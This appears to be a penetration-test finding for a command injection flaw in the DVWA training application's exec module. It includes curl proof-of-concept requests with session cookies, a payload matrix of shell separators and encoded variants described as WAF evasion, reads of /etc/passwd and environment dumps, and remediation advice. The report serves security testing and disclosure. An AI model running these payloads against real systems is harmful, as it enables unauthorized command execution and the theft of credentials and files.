# Command Injection (RCE) in DVWA /DVWA/vulnerabilities/exec/ via POST parameter "ip"

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2025-10-22 15:59:04 UTC

## Description

Summary
A command injection vulnerability exists in the DVWA Command Injection module at /DVWA/vulnerabilities/exec/. The POST parameter ip is concatenated into a system shell command without proper sanitization or parameterization, enabling arbitrary OS command execution on the server as the web user (www-data). The issue is reproducible at DVWA security level: low.

Affected Component
- URL: http://192.168.13.214/DVWA/vulnerabilities/exec/
- Method: POST
- Parameter: ip (form field), Submit=Submit
- Authentication context: DVWA authenticated session (security=low)
- Session cookies observed: PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low
- Proxy baseline request ID: 34
- Evidence file: /workspace/findings/dvwa_cmdinj_validation.json

Reproducible Steps
1) Login to DVWA (default creds in a freshly initialized instance are commonly admin / password).
2) Navigate to DVWA Security and set Security Level to Low.
3) Open Command Injection module: /DVWA/vulnerabilities/exec/
4) Submit the form with ip containing a shell metacharacter followed by a system command, e.g.:
   127.0.0.1; id
5) Observe the response includes the output of the injected command (e.g., uid=33(www-data) ...), confirming RCE.

HTTP PoC (cURL)
Request 1 – id (proof of code execution and running user)
curl -i 'http://192.168.13.214/DVWA/vulnerabilities/exec/' \
  -H 'Cookie: PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'ip=127.0.0.1; id&Submit=Submit'

Expected evidence in response body includes:
- uid=33(www-data) gid=33(www-data) groups=33(www-data)

Request 2 – uname -a (kernel info)
curl -i 'http://192.168.13.214/DVWA/vulnerabilities/exec/' \
  -H 'Cookie: PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'ip=127.0.0.1; uname -a&Submit=Submit'

Expected evidence: Linux kernel information line.

Request 3 – environment dump
curl -i 'http://192.168.13.214/DVWA/vulnerabilities/exec/' \
  -H 'Cookie: PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'ip=127.0.0.1; env&Submit=Submit'

Expected evidence: Environment variables showing context (e.g., USER/WWW user).

Request 4 – directory listing (/) and webroot
curl -i 'http://192.168.13.214/DVWA/vulnerabilities/exec/' \
  -H 'Cookie: PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'ip=127.0.0.1; ls -la /&Submit=Submit'

curl -i 'http://192.168.13.214/DVWA/vulnerabilities/exec/' \
  -H 'Cookie: PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'ip=127.0.0.1; ls -la /var/www/html&Submit=Submit'

Expected evidence: directory listings (drwx entries), files in webroot.

Request 5 – file read (/etc/passwd)
curl -i 'http://192.168.13.214/DVWA/vulnerabilities/exec/' \
  -H 'Cookie: PHPSESSID=turmqf3c4d8394e78clit57i4j; security=low' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'ip=127.0.0.1; cat /etc/passwd&Submit=Submit'

Expected evidence includes lines such as:
- root:x:0:0:root:/root:/bin/bash
- bin:x:1:1:bin:/bin:/usr/sbin/nologin
Demonstrating arbitrary file read on the host.

Validated Payload Matrix (successful)
Separators and constructs confirmed working:
- Semicolon: 127.0.0.1; id
- Logical AND: 127.0.0.1 && uname -a
- Pipe: 127.0.0.1 | id
- Subshell: 127.0.0.1; $(id) and backticks 127.0.0.1; `id`
- Newline injection: 127.0.0.1\nid
- Percent-encoded separators (WAF/encoding evasion):
  - 127.0.0.1%3Bid  (semicolon)
  - 127.0.0.1%26%26id (&&)
  - 127.0.0.1%7Cid  (pipe)

Additional informative payloads confirmed:
- 127.0.0.1; whoami            → www-data
- 127.0.0.1; pwd               → working directory shown
- 127.0.0.1; ls -la /var/www/html and /DVWA
- 127.0.0.1; cat /etc/issue     → distro banner
- 127.0.0.1; cat /proc/version  → kernel build details

Evidence Summary
Automated validation was executed by replaying baseline POST request (proxy ID 34) with a matrix of payloads. Responses were analyzed for markers: uid=, www-data, directory listings (drwx), kernel info, and /etc/passwd entries. Results:
- Successful payloads: at least 17 confirmed with explicit markers
- Proof-of-execution: uid=33(www-data), groups=…, Linux kernel details, environment variables present
- Proof-of-file-read: /etc/passwd contains root:x and system accounts
- Percent-encoded separators bypass also worked, confirming potential WAF/encoding evasion
- Evidence and request/response details stored at: /workspace/findings/dvwa_cmdinj_validation.json

Impact
- Arbitrary code execution on the server under the web server user (www-data)
- Read access to sensitive files (/etc/passwd demonstrated)
- System reconnaissance (kernel, environment, filesystem) enabling further exploitation
- Potential lateral movement, data exfiltration, and full service compromise depending on environment

CVSS v3.1
Base Score: 9.8 Critical
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Root Cause
User-controlled input (ip) is passed to an underlying shell command without strict allowlist validation or safe execution, enabling injection of shell metacharacters and arbitrary commands.

Recommendations
- Do not invoke the shell; avoid system()/exec()/passthru()/shell_exec() with user input.
- If an external command is absolutely required, use safe APIs that do not invoke a shell and pass arguments as an array (e.g., proc_open/exec with shell=False equivalents) and validate/escape strictly.
- Implement strict allowlist validation for ip: only digits and dots, optionally CIDR; reject anything else.
- If unavoidable, use escapeshellarg/escapeshellcmd as additional defense-in-depth (not primary).
- Enforce least privilege for the web service account; restrict file permissions and disable dangerous functions.
- Consider a WAF and input normalization to detect/block metacharacters and encoded variants.
- Log and alert on suspicious parameters containing shell metacharacters.
- Review all similar code paths handling user input for OS command execution.

Reproduction Notes
- Requires an authenticated DVWA session with security level set to low.
- Use the provided cURL PoCs with the Cookie header.
- Full replay and results are recorded under proxy baseline request ID 34 and JSON evidence file at /workspace/findings/dvwa_cmdinj_validation.json.

Appendix
Selected working payloads:
- 127.0.0.1; id
- 127.0.0.1 && uname -a
- 127.0.0.1 | id
- 127.0.0.1; env
- 127.0.0.1; ls -la /
- 127.0.0.1; cat /etc/passwd
- 127.0.0.1%3Bid
- 127.0.0.1%26%26id
- 127.0.0.1%7Cid

This vulnerability has been validated with concrete requests and responses demonstrating arbitrary command execution and sensitive file read on the target system.
